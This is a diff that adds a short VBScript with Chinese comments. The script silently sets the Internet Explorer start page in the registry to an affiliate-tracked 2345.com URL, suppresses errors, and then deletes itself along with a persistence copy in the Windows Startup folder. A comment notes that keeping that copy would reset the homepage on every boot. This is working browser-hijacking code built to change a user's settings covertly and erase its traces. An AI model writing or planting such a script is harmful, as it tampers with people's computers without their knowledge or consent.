@@ -1,0 +1,11 @@
+On Error Resume Next
+Dim WshShell 
+Set WshShell = CreateObject("Wscript.Shell") 
+WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.2345.com/?k269259"
+
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+WScript.Sleep 1000 '将脚本执行挂起1秒
+fso.DeleteFile(WScript.ScriptName) '删除脚本自身
+If fso.FileExists("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\IE.VBS") Then fso.DeleteFile("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\IE.VBS") '删除程序 如果不想删除可以每次都修改主页
+wscript.quit
